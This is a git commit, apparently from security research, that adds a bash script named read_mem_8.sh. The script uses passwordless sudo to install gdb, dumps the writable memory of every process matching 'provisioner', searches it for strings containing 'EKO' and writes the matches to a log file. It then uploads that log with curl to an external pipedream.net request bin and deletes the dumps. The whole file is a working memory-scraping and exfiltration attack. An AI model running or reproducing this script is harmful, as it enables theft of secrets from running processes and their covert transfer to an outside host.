544f635a94e34dc10df234067796f4e6b7d1613f
Sebastian Rodriguez <sebastian.rodriguez@onapsis.com>
2021-11-04 15:37:46 -0300

    .

---
+++ cmds/read_mem_8.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+
+# install gdb sudo is passwordless according to doc
+sudo apt-get install gdb -y > /tmp/file.txt
+
+mkdir dumps
+echo "STARTING..." >> /tmp/file.txt
+
+for pid in $(ps -ef | grep provisioner  | tr -s ' ' | cut -d ' ' -f2)
+do
+    echo "-----$pid-----" >> /tmp/file.txt;
+    grep rw-p /proc/$pid/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+        echo "> $start-$stop" >> /tmp/file.txt;
+        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
+        strings dumps/* | grep EKO >> /tmp/file.txt; \
+        rm dumps/$pid-$start-$stop.dump; \
+    done
+    echo "--------------" >> /tmp/file.txt;
+done
+
+echo "FINISHED..." >> /tmp/file.txt
+
+curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
+
+rm -rf dumps/
